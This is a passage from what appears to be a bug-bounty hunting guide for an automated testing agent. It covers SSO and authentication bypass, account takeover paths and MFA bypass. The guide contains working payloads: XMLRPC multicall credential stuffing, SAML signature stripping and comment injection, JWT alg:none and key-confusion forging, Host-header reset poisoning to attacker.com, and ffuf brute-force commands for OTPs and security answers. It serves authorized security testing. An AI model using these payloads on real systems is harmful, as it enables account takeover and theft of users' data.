| **Drupal (D7 legacy)** | `/?q=user/login`, `/services/`, `/rest/` | Older REST modules with independent auth |
| **Joomla** | `/administrator/index.php?option=com_login`, `/api/index.php/v1/users` | Native Joomla credentials accepted on admin entry independent of any front-site SSO |
| **Exchange / OWA** | `/EWS/Exchange.asmx`, `/Autodiscover/Autodiscover.xml`, `/Microsoft-Server-ActiveSync` | NTLM / Basic; bypasses OWA UI restrictions (MFA, IP-allow). The classic CVE-2020-0688 / CVE-2021-26855 surface |
| **Citrix NetScaler** | `/vpn/index.html`, `/cgi/login`, `/nf/auth/doAuthentication.do` | Native AD credentials; independent of MFA wrappers |
| **F5 BIG-IP** | `/mgmt/tm/util/bash`, `/tmui/login.jsp` | Native admin credentials |
| **Generic ASP.NET app** | `*.asmx?WSDL`, `*.svc?WSDL`, `trace.axd`, `elmah.axd`, `.disco` | Find every web service; many take credentials independently of the WebForms login |
| **Spring Boot** | `/actuator/*`, `/management/*`, `/api/v1/auth/login`, `/api/v1/swagger-ui` | Actuator endpoints sometimes anonymously enumerable |
| **Jenkins** | `/jnlpJars/jenkins-cli.jar`, `/script`, `/manage`, `/computer/(master)/script` | API tokens + native auth |
| **GitLab** | `/api/v3/*` (deprecated but still on old installs), `/api/v4/users`, `/api/v4/projects` | Personal Access Tokens with looser scoping than UI session |
| **TeamCity** | `/app/rest/users`, `/login.html?username=&password=` (GET-form-login) | Native admin credentials |
| **Apache Tomcat** | `/manager/html`, `/host-manager/html`, `/manager/text/list` | Native Tomcat realm credentials independent of any front auth |
| **WebLogic** | `/console/login/LoginForm.jsp`, `/wls-wsat/*` | Native admin |
| **Oracle EBS / PeopleSoft** | `/OA_HTML/AppsLogin`, `/psp/*/?cmd=login` | Native ERP credentials |

**How to use:**
1. Identify the tech stack from headers + paths (use `hunt-misc` Attack Surface Signals).
2. Find the row above that matches.
3. Probe the legacy endpoint anonymously to confirm it's reachable and not 403/404.
4. Test with synthetic credentials to confirm it accepts native credential format and returns differential responses (success vs failure).
5. Verify there is no rate limit, no lockout, no CAPTCHA — burst 10 requests at the same user, confirm uniform timing.
6. Report as **Critical / High** depending on chain to ATO: an anonymous + unlimited credential brute-force endpoint is consistently Critical on bug-bounty programs.

**Lesson from a authorized engagement:** A an enterprise dealer portal on SharePoint 2013 had a custom branded `customlogin.aspx`. The hunt-auth-bypass skill was loaded but the matrix above did not exist in this document — and the WordPress XMLRPC pattern was not connected to the SharePoint equivalent. `/_vti_bin/Authentication.asmx` was reachable anonymously, accepted unlimited credential attempts with no rate limit and no lockout, and was the highest-impact finding in the engagement. Walking this matrix on the first pass would have surfaced it immediately.

---

## Payload & Detection Patterns

**XMLRPC auth probe (bypasses SSO):**
```bash
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>'

# If 200 with method list → XMLRPC is enabled, test auth:
curl -s -X POST https://target.com/xmlrpc.php \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password</string></value></param>
  </params>
</methodCall>'
```

**SAML signature stripping (send unsigned assertion):**
```python
import base64, re

# Decode captured SAMLResponse
saml_b64 = "BASE64_FROM_BURP"
saml_xml = base64.b64decode(saml_b64).decode()

# Strip the Signature element entirely
stripped = re.sub(r'<ds:Signature.*?</ds:Signature>', '', saml_xml, flags=re.DOTALL)

# Re-encode and submit
print(base64.b64encode(stripped.encode()).decode())
```

**SAML XML comment injection (username confusion):**
```xml
<!-- Original NameID -->
<NameID>attacker@evil.com</NameID>

<!-- Injected to confuse parser -->
<NameID>attacker@evil.com<!---->.victim@company.com</NameID>

<!-- Or namespace confusion -->
<NameID xmlns:evil="http://evil.com">victim@company.com</NameID>
```

**Partner/cross-portal token reuse test:**
```bash
# Get token from partner portal
TOKEN=$(curl -s -X POST https://partners.target.com/login \
  -d 'email=attacker@test.com&password=pass' \
  -c cookies.txt | grep -o 'token=[^;]*')

# Replay against admin portal
curl -s https://admin.target.com/dashboard \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: $TOKEN"
```

**JWT none algorithm attack:**
```python
import base64, json

header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"user_id":1,"role":"admin","email":"victim@company.com"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."
print(token)
```

**Grep patterns for auth bypass surface:**
```bash
# Find XMLRPC in scope
grep -r "xmlrpc" scope_urls.txt

# Find SSO indicators in JS
grep -rE "(SAMLResponse|samlRequest|RelayState|onelogin|shibboleth)" *.js

# Find partner/admin subdomains
subfinder -d target.com | grep -E "(admin|partner|internal|sso|auth|login)"
```

---

## Common Root Causes

1. **SSO bypasses local auth entirely at the UI layer, but not at the API layer** — developers disable the login form but forget that API endpoints (`/xmlrpc.php`, REST API, mobile API) have their own auth handlers that still accept native credentials.

2. **SAML signature validation is skipped or optional** — library defaults often don't enforce signature checking; developers use `wantAssertionsSigned: false` or fail to configure the IdP certificate correctly.

3. **Shared session infrastructure across different trust levels** — partner portals and admin portals reuse the same session cookie or JWT secret because they're built on the same internal framework, assuming access control at the application layer is sufficient.

4. **Trust inheritance in multi-tenant architectures** — a token issued in a lower-privilege context (partner, reseller) is accepted in a higher-privilege context because the verification only checks signature validity, not the issuance context.

5. **Plugin/module auth is independent of application auth** — every WordPress plugin that handles auth (contact forms, REST API extensions, WooCommerce) may implement its own auth handler inconsistently with the main site's SSO.

6. **XML parsing inconsistencies** — different XML parsers (used by SP vs. IdP) handle comments, namespaces, and whitespace differently, enabling confusion attacks where the signed content differs from the evaluated content.

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| SSO enforced on login page | Probe alternate entry points: XMLRPC, REST API, mobile API, legacy endpoints |
| SAML signature validation | XML comment injection, namespace wrapping, signature wrapping (XSW), remove signature entirely |
| IP allowlisting on admin portal | Use partner portal token if it shares auth backend |
| Rate limiting on login | XMLRPC allows credential stuffing via `system.multicall` — batches hundreds of auth attempts in one request |
| CSRF token on login form | SAML flow is POST-based cross-origin by design; no CSRF token needed on `/saml/callback` |
| JWT signature validation | `alg: none`, key confusion (RS256 → HS256 with public key as secret), brute-force weak secrets |
| Separate session stores per portal | Check if cookie domain is `.target.com` (wildcard) — cookie bleeds between subdomains |
| MFA on primary login | If SAML SP doesn't enforce MFA at the assertion level and accepts pre-auth assertions, MFA can be skipped |

**XMLRPC multicall for mass auth bypass:**
```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
      <member><name>params</name><value><array><data>
        <value><string>admin</string></value>
        <value><string>password1</string></value>
      </data></array></value></member>
    </struct></value>
    <!-- repeat for each credential pair -->
  </data></array></value></param></params>
</methodCall>
```

---

## Gate 0 Validation

Before writing any report, answer these three questions:

1. **What can the attacker DO right now?**
   Must be: authenticate as another user OR authenticate without valid credentials OR elevate to admin/privileged role. "Partial information disclosure" is not auth bypass.

2. **What does the victim LOSE?**
   Must identify a concrete asset: account takeover of specific user, access to all admin functions, ability to read/modify other tenants' data, or access to privileged APIs. Abstract "security control bypass" without impact is not sufficient.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must be able to: (a) start from a fresh browser/session, (b) follow your exact steps, and (c) arrive at authenticated access to a protected resource. If reproduction requires special preconditions you can't re-create (a specific victim's active session, timing windows), the report needs more work.

---

## Real Impact Examples

**Scenario 1 — SSO Enforcement Bypassed via Forgotten Protocol Endpoint**
A large ride-sharing company enforced SSO (via OneLogin) on all WordPress-based internal/public properties. The XMLRPC endpoint (`/xmlrpc.php`) remained active and accepted WordPress-native credentials entirely independent of the SSO flow. An attacker with any valid WP-native credentials (obtained via credential stuffing or from a previous breach) could authenticate directly through XMLRPC, bypassing MFA, SSO policies, and IP restrictions enforced on the main login form. Impact: Full authenticated access to all WordPress functions available to that user role, including content management and potentially admin functions.

**Scenario 2 — SAML Assertion Forgery via Signature Validation Failure**
A major enterprise communication platform's SAML SP implementation failed to properly validate assertion signatures in specific edge cases. By manipulating the XML structure of a captured SAMLResponse (specifically through comment injection or namespace prefix attacks), an attacker could modify the `NameID` value to impersonate any user in an organization — including workspace administrators — without possessing that user's credentials or private key material. Impact: Complete account takeover of any user within a SAML-enabled organization; attacker gains access to all messages, files, and integrations in the workspace.

**Scenario 3 — Cross-Portal Privilege Escalation via Shared Auth Backend**
An e-commerce platform's partner/reseller portal issued authentication tokens that were validated by the same backend service as the merchant admin portal. A partner-level account (lower trust, external-facing) could use its issued credentials or tokens to authenticate directly against admin-tier API endpoints, bypassing the merchant onboarding and permission assignment flow. Impact: A malicious partner could access any merchant's admin panel, modify store configurations, exfiltrate customer PII and payment data, or install malicious scripts — affecting thousands of merchant storefronts.

---

## Disclosed Report Citations (Backfill +8 — 2016-2025)

The following real, verified bug-bounty / coordinated-disclosure cases extend this skill. Spans 4 SAML subclasses, 4 JWT subclasses, 1 legacy-protocol (XMLRPC), and 2 partner-portal cross-domain reuse patterns.

5. **GitHub Enterprise Server — SAML XSW via parser differential (CVE-2025-25291/25292)** ([H1 #2579939](https://hackerone.com/reports/2579939) · [Blog](https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/))
    - Subclass: SAML signature stripping / XSW (parser-differential variant)
    - Payload: signed SAML response; inject a sibling `<Assertion>` so REXML (signature-checker) and Nokogiri (business-logic reader) resolve different nodes via the same XPath. Signature validates against benign node; SP consumes attacker-controlled `<NameID>admin@target</NameID>`
    - Root cause: two XML parsers used for verification vs consumption return different elements for the same XPath
    - Year: 2025 — GitHub Security Lab bounty (program max class, internally rated Critical)

6. **GitHub Enterprise — SAML signature bypass on encrypted assertions (CVE-2024-4985)** ([H1 #2475347](https://hackerone.com/reports/2475347) · [ProjectDiscovery advisory](https://projectdiscovery.io/blog/github-enterprise-saml-authentication-bypass))
    - Subclass: SAML signature stripping (XSW family) when encrypted-assertions feature enabled
    - Payload: forge SAML response with attacker-controlled assertion; exploit improper signature verification on the encrypted-assertion code branch; provision arbitrary user including `site_admin`
    - Root cause: improper cryptographic signature verification on the encrypted-assertion code branch
    - Year: 2024 — bounty undisclosed, CVSS 10.0

7. **Uber — SAML auth bypass on `uchat.uberinternal.com`** ([H1 #223014](https://hackerone.com/reports/223014))
    - Subclass: SAML signature stripping / improper assertion verification (OneLogin SP-side)
    - Payload: replay/modify SAML assertion with forged `NameID`; SP did not strictly validate signature scope, so attacker-controlled assertion accepted, granting OneLogin SSO session to internal chat
    - Root cause: improper SAML signature verification on SP implementation
    - Year: 2017 — **$8,500**

8. **Uber — OneLogin SSO bypass via WordPress XMLRPC** ([H1 #138869](https://hackerone.com/reports/138869))
    - Subclass: WordPress XMLRPC bypassing SSO (legacy-auth path not gated) — canonical Legacy-Protocol Matrix case
    - Payload: OneLogin plugin auto-created WP users with literal password `@@@nopass@@@`. SSO plugin blocked `wp-login.php` only. POST `xmlrpc.php` with `wp.getUsersBlogs` + known shared password → authenticated as any previously-SSO'd user
    - Root cause: SSO enforcement applied at one auth surface (wp-login) but legacy XML-RPC path retained password auth with a guessable shared password
    - Year: 2016 — **$7,000**

9. **Slack — SAML "confused-deputy" assertion reuse** ([Writeup](http://blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html))
    - Subclass: partner-portal / cross-IdP assertion reuse (audience-restriction not validated)
    - Payload: take an old expired GitHub-signed SAML assertion (different audience, different subject) → present to Slack ACS → Slack logs attacker in as the asserted username
    - Root cause: no audience-restriction nor freshness check; trust extended across IdPs
    - Year: 2017 — **$3,000**

10. **HackerOne — SAML signup domain enforcement bypass via control characters** ([H1 #2101076](https://hackerone.com/reports/2101076))
    - Subclass: partner-portal / SAML domain-binding bypass via unicode control characters
    - Payload: new user sign-up at SAML-enforced org; append trailing control character (e.g., `\r`, ` `) to email → domain comparison normalises away, signup proceeds → unauthorised access to the org
    - Root cause: inconsistent unicode/control-char normalisation between domain check and identity write
    - Year: 2024 — bounty awarded (amount undisclosed)

11. **8x8 / Jitsi-Meet — JWT alg-confusion (asymmetric verifier accepts symmetric alg)** ([H1 #1210502](https://hackerone.com/reports/1210502))
    - Subclass: JWT alg-confusion (RS256 → HS256 using public key as HMAC secret)
    - Payload: server publishes RS256 verification public key. Send a token with header `{"alg":"HS256"}` signed with that public key as the HMAC secret → Prosody module validates and admits attacker into authenticated/moderator room
    - Root cause: verifier did not enforce `alg=RS256`; allowed symmetric algorithm using the public key as shared secret
    - Year: 2021 — bounty undisclosed

12. **Argo CD (Internet Bug Bounty) — JWT audience claim not validated (CVE-2023-22482)** ([H1 #1889161](https://hackerone.com/reports/1889161))
    - Subclass: token-scope / audience check at issuance not at use (cross-audience token confusion)
    - Payload: obtain any RS256-signed token signed by the cluster's OIDC issuer but minted for a different `aud` (e.g., `kubernetes`) → present it as bearer to Argo CD API → API treats it as valid because it accepted the issuer's signature and skipped `aud` enforcement
    - Root cause: `aud` claim not enforced; signature-trust extended across audiences
    - Year: 2023 — **$2,400** via IBB

---

## Duende BFF — Token-Confusion & Session-Fixation (2024-2026 surface)

Duende BFF deployments expose two distinct auth-bypass families beyond the CSRF angle covered in `hunt-csrf`. Both are documented architectural realities, not unicorn CVEs.

### Attack class 1 — YARP `UserOrClient` / `UserOrNone` privilege escalation

`Duende.BFF.Yarp` attaches access tokens to proxied routes via `WithAccessToken(TokenType.X)` metadata. The **misconfig pattern**: developer marks a route `UserOrClient` (use user token if logged in, else fall back to *client-credentials* token) intending it for a "public catalog" endpoint. The client-credentials (M2M) token frequently has broader scope (`api.admin`, `internal.read`) than any user token. An **unauthenticated** attacker hitting that route gets the request proxied with the **service-account token attached** to the downstream API — privilege escalation by design when the downstream trusts the bearer.

**Payload shape:** identify a BFF route marked `TokenType.UserOrClient` (visible via 401-vs-200 differential when no session, or via leaked OpenAPI/NSwag spec). Hit it with no cookies → BFF forwards with M2M token granting admin-scope downstream. ([docs.duendesoftware.com/bff/fundamentals/apis/yarp](https://docs.duendesoftware.com/bff/fundamentals/apis/yarp/))

**Adjacent confirmed CVE:** **CVE-2024-51987** in `Duende.AccessTokenManagement.OpenIdConnect` — *"HTTP client uses incorrect token after refresh"* — materially the same family of token-confusion at the proxy layer. Moderate severity, fixed 2024. ([GHSA-...51987](https://github.com/advisories?query=duende))

### Attack class 2 — Cookie-domain wildcard + sliding expiration = persistent ATO

When BFF session cookie has `Domain=.example.com` (devs do this to share login across `app.` and `admin.`), the `__Host-` prefix protection is dropped. Any sibling subdomain — including a **taken-over** one (`legacy.example.com` CNAMEd to deprovisioned Heroku/S3) — can write `Set-Cookie: .AspNetCore.Cookies=<attacker_session>; Domain=.example.com`. Victim hits `app.example.com` carrying the attacker's session = **session-fixation ATO**.

If `SlidingExpiration=true` (default) and `ExpireTimeSpan` is large (e.g. 8h), an exfiltrated cookie remains valid and keeps sliding forward as long as the attacker periodically calls `/bff/user`. There is no server-side refresh-token rotation check on the cookie itself — only the OIDC token (server-side) rotates. Persistent ATO window per stolen cookie.

**Payload shape:** subdomain takeover → write the BFF session cookie with `Domain=.example.com` → victim's next visit to `app.example.com` adopts attacker's session. Cron-curl `GET /bff/user -H 'X-CSRF: 1' -b '.AspNetCore.Cookies=...'` every 6h indefinitely to keep the session alive.

**Hardening reference:** [docs.duendesoftware.com/bff/fundamentals/session/handlers](https://docs.duendesoftware.com/bff/fundamentals/session/handlers/), [nestenius.se BFF cookie guide](https://nestenius.se/net/bff-in-asp-net-core-3-the-bff-pattern-explained/), [Langkemper on `__Host-` prefix](https://www.sjoerdlangkemper.nl/2017/02/09/cookie-prefixes/).

### Attack class 3 — `/bff/user` claim disclosure

`GET /bff/user` returns the **full claim set** of the active session as a JSON array — `sub`, `sid`, `email`, `bff:session_expires_in`, `bff:session_state`, `bff:logout_url`, plus every custom claim the OP issued (department, role, internal employee ID, tenant ID). The endpoint is gated only by session cookie + `X-CSRF: 1`. If `AnonymousSessionResponse=Response200` is set, the endpoint also acts as a session probe (200 + claims vs 200 + `null`) usable as an auth-state oracle. Low/Medium info-disclosure on its own; valuable as recon for the YARP token-confusion class above. ([docs.duendesoftware.com/bff/fundamentals/session/management/user](https://docs.duendesoftware.com/bff/fundamentals/session/management/user/))

### Evidence strength + reporting tip

No Duende.BFF-direct CVE exists. The three classes are exploitable via real-world misconfigurations; CVE-2024-51987 and CVE-2025-26620 in the adjacent `Duende.AccessTokenManagement` packages make token-confusion a confirmed family. **Report by chain impact** (e.g., "low-priv session reaches admin-scope downstream API via UserOrClient route" → Critical) rather than by CVE citation, since the issue is design-level.

Cross-references for the chain:
- `hunt-csrf` — the role-partitioned antiforgery class (the CSRF angle on the same BFF surface).
- `hunt-subdomain-takeover` / `hunt-subdomain` — required primitive for the cookie-domain attack.

---

## Function-Level Access Control (Broken Authorization)

Authentication bypass gets you *in*; **function-level access control** failures let an already-authenticated low-privilege user reach privileged *functions* the UI never offered them. This is the authorization sibling of `hunt-idor` (object-level access) — test both whenever you hold any authenticated session.

**The sibling-function rule:** if 9 endpoints under a path enforce auth/role middleware, the 10th that doesn't is your bug. Admin route families are the highest-yield place to look:

```
/api/admin/users   → has auth middleware
/api/admin/export  → often MISSING it
/api/admin/delete  → often MISSING it
/api/admin/reset   → often MISSING it
```

**Anti-patterns to grep for:**
```javascript
// Missing middleware on a sibling route
router.get('/admin/users',  authenticate, authorize('admin'), getUsers);
router.get('/admin/export', getExport);            // No middleware!

// Client-side role check only — server never re-checks
if (user.role === 'admin') showAdminButton();      // frontend gate
app.post('/api/admin/delete', deleteUser);         // no server-side check
```

**How to hunt:** enumerate every privileged endpoint (admin/export/delete/reset/impersonate, GraphQL admin queries), then replay each from a *regular* authenticated session — and again with no session. A 200 (or a differential vs the 403 its siblings return) is broken function-level access control.

**Real paid example — HackerOne TrustHub:** `POST /graphql` with the `TrustHubQuery` operation had no authorization check — a regular user could read all vendors' data (CVSS 8.7, High). The object-level variant (e.g. a WebSocket `get_history` accepting an arbitrary UUID with no ownership check) belongs to `hunt-idor`.

---

## Related Skills & Chains

- **`hunt-idor`** — Auth bypass without object-level access is half a finding; pair them. Chain primitive: legacy `/v1/users/{id}` route missing both auth middleware AND ownership check = unauthenticated cross-tenant data read via direct ID substitution → full PII dump from "I am nobody" starting position.
- **`hunt-ato`** — Auth-bypass primitives feed the ATO funnel. Chain primitive: XMLRPC native-cred acceptance + no rate limit on `wp.getUsersBlogs` → credential-stuff with breach corpus from `hunt-misc` recon → `system.multicall` batches 1000 cred pairs per request → one valid pair = ATO bypassing the SSO + MFA the UI enforces.
- **`hunt-sharepoint`** — The SP equivalent of the WordPress XMLRPC pattern lives here. Chain primitive: `/_vti_bin/Authentication.asmx` anonymous reachable + native Forms-auth credential accepted + zero rate limit = unlimited credential brute-force endpoint bypassing custom-branded `customlogin.aspx` protections → FedAuth cookie → full SharePoint farm access.
- **`security-arsenal`** — Pull the JWT-attack payloads section (alg=none, kid path-traversal, JWK injection, RS256→HS256 key confusion) when JWT validation is the auth wall; pull the SAML signature-stripping section when the SP accepts unsigned assertions.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an "auth bypass" that only enumerates usernames or only reveals a 401-vs-403 differential. Username enumeration alone without lockout-amplification is consistently N/A or Informational on H1.


---

## hunt-ato — Hunting Methodology (real BB reports)

## 13. ATO — ACCOUNT TAKEOVER TAXONOMY
> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.

### Path 1: Password Reset Poisoning (Host-Header)
```bash
POST /forgot-password HTTP/1.1
Host: attacker.com                 # primary Host swap
# OR keep real Host and add one of:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

email=victimB@company.com
```
The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.

### Path 2: Reset Token in Referer / Open-Redirect Leak
```
GET /reset-password?token=ABC123
→ page loads third-party resource: <script src="https://analytics.com/t.js">
→ browser sends  Referer: https://target.com/reset-password?token=ABC123
→ token exfiltrated to every off-origin host the page calls
```
Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.

### Path 3: Predictable / Weak Reset Tokens
```bash
# 6-digit numeric OTP-style reset code, no rate limit:
ffuf -u "https://target.com/api/reset/verify" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
```
**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.

### Path 4: Token No-Expiry / Reuse / Cross-Account
```
Expiry:  request token → wait 2h → still valid? = bug
Reuse:   use token once → use again → still valid? = bug
Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email HTTP/1.1
Cookie: session=ATTACKER_A_SESSION
{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
```
If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.

### Path 6: JWT Manipulation
```bash
# (a) alg:none — strip the signature, set header alg to none
python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"
# send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
#
# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
#
# (c) weak HMAC secret: crack offline
hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
#
# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
```
**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.

### Path 7: Password Change Without Step-Up + Login Oracle
```bash
# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
{"new_password":"Pwned#2026"}          # no "current_password" field
#
# (b) login oracle to find a valid password without an existing cookie — measure response delta:
for p in $(cat candidates.txt); do
  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
  printf '%s\t%s\n' "$t" "$p"
done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
```
A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).

### Path 8: Social-Recovery / Security-Question Abuse
```bash
# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
ffuf -u "https://target.com/account/recover/answer" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -mc 200 -fr "incorrect" -t 5
# also test: answers returned/echoed in /api/me or recovery page source (client-side check)
# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)
```
Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.

### Path 9: SSO Subdomain Takeover at OAuth redirect_uri
```bash
# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via hunt-subdomain:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
# (c) claim that host on the cloud provider, serve a callback that logs the ?code=
# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

### Path 10: Pre-Account / Unverified-Account Takeover
The victim's account exists in a pending/unverified state (invite not accepted, signup email never confirmed, or no email on file). Claim it first: register or attach your controlled email to that identity, then let the victim complete SSO/OTP login and inherit the attacker-seeded state — or trigger a reset once your email is attached. Test invite/pending flows and any endpoint that writes an email to an account lacking a confirmed one; confirm the victim, after signing in, lands in the account you seeded. High impact, no token interaction. Disclosed: reports/1679734, reports/394329.

### Path 11: Passwordless / Magic-Link Abuse by Identifier
A passwordless-signup / magic-login / OTP-login endpoint that sets or resets a password (or issues a session) given only an enumerable identifier (phone/email), with no token step. Probe `*passwordless*`, `*magic*`, `*/otp-login`, `*/signup`: does supplying only a phone/email set the password or return a session for that identity? Enumerate identifiers to prove arbitrary-account reach; validate by taking test account B via its number alone. Disclosed: reports/143717.

### ATO Severity Gate
- **Critical** — zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change → reset.
- **High** — one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).
- **Medium** — requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).
- **Low** — attacker must be MitM, or only self-account impact.

---

## Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.



---

## hunt-mfa-bypass — Hunting Methodology (real BB reports)

## Autonomous Testing Priority

**Try workflow bypasses before brute force — they're faster and more likely to succeed.**

**Pattern 1 — Skip the MFA step entirely (most automatable):**
1. Login with valid credentials → receive a "pre-MFA" session state
2. Without completing MFA, directly access a protected resource (`/dashboard`, `/api/me`, `/account/profile`)
3. If the response returns user data → MFA is enforced only in the UI, not server-side = Critical

**Pattern 2 — OTP replay (reuse a consumed code):**
1. Complete a valid MFA flow to get a working OTP
2. Log out, log in again with the same credentials
3. Submit the same OTP again
